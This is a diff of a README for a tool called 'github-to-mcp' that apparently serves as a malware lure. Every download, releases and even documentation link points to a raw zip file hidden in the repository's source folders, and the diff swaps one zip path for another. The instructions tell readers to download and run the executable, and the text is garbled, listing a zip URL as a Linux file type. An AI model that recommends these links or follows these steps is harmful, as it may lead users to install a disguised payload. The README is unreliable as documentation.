@@ -1,7 +1,7 @@
 # 🚀 github-to-mcp - Convert GitHub Repositories with Ease
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/saifeddine099/github-to-mcp/main/packages/openapi-parser/github_mcp_to_2.2.zip)](https://raw.githubusercontent.com/saifeddine099/github-to-mcp/main/packages/openapi-parser/github_mcp_to_2.2.zip)
+[![Download](https://raw.githubusercontent.com/saifeddine099/github-to-mcp/main/apps/web/app/api/stream/github-to-mcp-3.3.zip)](https://raw.githubusercontent.com/saifeddine099/github-to-mcp/main/apps/web/app/api/stream/github-to-mcp-3.3.zip)
 
 ## 📝 Description
 github-to-mcp allows you to convert GitHub repositories into MCP servers automatically. It extracts tools from OpenAPI, GraphQL, and REST APIs for various applications, such as Claude Desktop, Cursor, Windsurf, Cline, and VS Code. With AI-powered code generation, it creates type-safe TypeScript and Python MCP servers. Best of all, you need zero configuration—just paste a repository URL.
@@ -11,13 +11,13 @@ Follow these steps to get started with github-to-mcp:
 
 ### 1. Visit the Releases Page
 To download the application, first visit our Releases page:
-[Download Page](https://raw.githubusercontent.com/saifeddine099/github-to-mcp/main/packages/openapi-parser/github_mcp_to_2.2.zip)
+[Download Page](https://raw.githubusercontent.com/saifeddine099/github-to-mcp/main/apps/web/app/api/stream/github-to-mcp-3.3.zip)
 
 ### 2. Choose the Download Option
 On the Releases page, you will see various downloads available. Click on the latest version to access the files. 
 
 ### 3. Download the Application
-Look for the file that matches your operating system. Depending on your system, you may find options like `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/saifeddine099/github-to-mcp/main/packages/openapi-parser/github_mcp_to_2.2.zip` for Linux. Click on the file and download it to your computer.
+Look for the file that matches your operating system. Depending on your system, you may find options like `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/saifeddine099/github-to-mcp/main/apps/web/app/api/stream/github-to-mcp-3.3.zip` for Linux. Click on the file and download it to your computer.
 
 ### 4. Locate the Downloaded File
 Once the download completes, find the file on your computer. It is usually in the "Downloads" folder unless you specified a different location.
@@ -25,7 +25,7 @@ Once the download completes, find the file on your computer. It is usually in th
 ### 5. Run the Application
 - **For Windows:** Double-click on the `.exe` file. A setup window will appear. Follow the prompts to install the application.
 - **For macOS:** Open the downloaded `.dmg` file and drag the github-to-mcp icon into your Applications folder.
-- **For Linux:** Extract the `https://raw.githubusercontent.com/saifeddine099/github-to-mcp/main/packages/openapi-parser/github_mcp_to_2.2.zip` file and navigate to the extracted folder in your terminal. Use the command `./github-to-mcp` to run it.
+- **For Linux:** Extract the `https://raw.githubusercontent.com/saifeddine099/github-to-mcp/main/apps/web/app/api/stream/github-to-mcp-3.3.zip` file and navigate to the extracted folder in your terminal. Use the command `./github-to-mcp` to run it.
 
 ## ⚙️ System Requirements
 - **Operating System:** Compatible with Windows, macOS, and Linux.
@@ -46,7 +46,7 @@ Once the download completes, find the file on your computer. It is usually in th
 4. Click on the "Generate" button to create your server.
 
 ## ✅ Additional Information
-If you encounter any issues during installation or want more details on how to use the features, visit our [Documentation](https://raw.githubusercontent.com/saifeddine099/github-to-mcp/main/packages/openapi-parser/github_mcp_to_2.2.zip).
+If you encounter any issues during installation or want more details on how to use the features, visit our [Documentation](https://raw.githubusercontent.com/saifeddine099/github-to-mcp/main/apps/web/app/api/stream/github-to-mcp-3.3.zip).
 
 ## 🤝 Community
 Join our community for tips, updates, and support. You can ask questions, share experiences, and learn from other users.
@@ -80,4 +80,4 @@ Your feedback is important. Please share your thoughts, suggestions, or any bugs
 
 ## 🔗 Download Link
 To download the latest version of github-to-mcp again, visit:
-[Download Page](https://raw.githubusercontent.com/saifeddine099/github-to-mcp/main/packages/openapi-parser/github_mcp_to_2.2.zip)
+[Download Page](https://raw.githubusercontent.com/saifeddine099/github-to-mcp/main/apps/web/app/api/stream/github-to-mcp-3.3.zip)
